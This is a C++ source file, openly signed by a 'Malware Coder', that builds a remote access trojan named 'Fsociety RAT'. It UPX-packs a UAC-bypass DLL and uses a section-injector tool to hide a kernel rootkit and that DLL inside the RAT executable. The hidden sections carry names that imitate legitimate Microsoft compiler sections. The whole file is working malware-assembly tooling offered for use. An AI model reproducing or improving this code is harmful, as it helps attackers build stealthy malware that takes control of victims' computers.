/*
##################################################
#                                                #
#         Malware Coder: Elliot Alderson         #
#                                                #
#   Github: https://github.com/ElliotAlderson51  #
#                                                #
##################################################
*/

#include <iostream>
#include <Windows.h>

#define UNLEN 256 // User Name Length

bool FileExists(const std::string& path)
{
    DWORD dwAttribute = GetFileAttributesA(path.c_str());
    if (dwAttribute != INVALID_FILE_ATTRIBUTES && !(dwAttribute & FILE_ATTRIBUTE_DIRECTORY))
        return true;
    return false;
}

int main()
{
    std::string rootkit_section_name = ".msvcjmc";
    std::string dll_section_name = ".00cfg";


    std::string path = "E:\\Fsociety Remote Administration Tool\\Fsociety RAT\\";
    std::string final_folder = path + "Final\\";
    std::string section_injector = path + "Release\\Section_Injector.exe";
    
    std::string RAT = "";
    std::string Rootkit = "";
    std::string DLL = "";

    std::cout << "Debug: 1\nRelease: 2:\n> ";
    
    int option;
    std::cin >> option;

    if (option == 1) // Debug
    {
        rootkit_section_name = "rootkit";
        dll_section_name = "dll";

        RAT = path + "Debug\\RAT.exe";
        Rootkit = path + "Debug\\Rootkit_32bit.sys";
        DLL = path + "Debug\\DLL - Bypass UAC.dll";
    }
    else if (option == 2) // Release
    {
        RAT = path + "Release\\RAT.exe";
        Rootkit = path + "Release\\Rootkit_32bit.sys";
        DLL = path + "Release\\DLL - Bypass UAC.dll";
    }
    else
    {
        std::cout << "Invalid option...\n";
        return 0;
    }

    if (FileExists(section_injector))
    {
        if (FileExists(RAT))
        {
            if (FileExists(Rootkit))
            {
                if (FileExists(DLL))
                {
                    DeleteFileA((final_folder + "RAT.exe").c_str());
                    DeleteFileA((final_folder + "DLL - Bypass UAC.dll").c_str());
                    if (CopyFileA(RAT.c_str(), (final_folder + "RAT.exe").c_str(), FALSE))
                    {
                        if (SetCurrentDirectoryA(final_folder.c_str()))
                        {
                            std::string upx_command = "upx.exe.lnk \"" + DLL + "\" -o \"" + final_folder + "DLL - Bypass UAC.dll\"";
                            system(upx_command.c_str());

                            if (FileExists(final_folder + "DLL - Bypass UAC.dll"))
                            {
                                if (SetCurrentDirectoryA((path + "Release").c_str()))
                                {
                                    std::string inject_rootkit = "Section_Injector.exe " + rootkit_section_name + " \"" + final_folder + "RAT.exe\" \"" + Rootkit + "\"";
                                    std::string inject_DLL = "Section_Injector.exe " + dll_section_name + " \"" + final_folder + "RAT.exe\" \"" + final_folder + "DLL - Bypass UAC.dll" + "\"";

                                    std::cout << "Rootkit:\n\n" << inject_rootkit << "\n\n";
                                    std::cout << "DLL:\n\n" << inject_DLL << "\n\n";

                                    system(inject_rootkit.c_str());

                                    Sleep(1000);

                                    system(inject_DLL.c_str());

                                    Sleep(1000);

                                }
                            }
                        }
                    }
                }
            }
        }
    }

    std::cout << "\n\nLast Error #" << GetLastError() << "\n\n";

    return 0;

}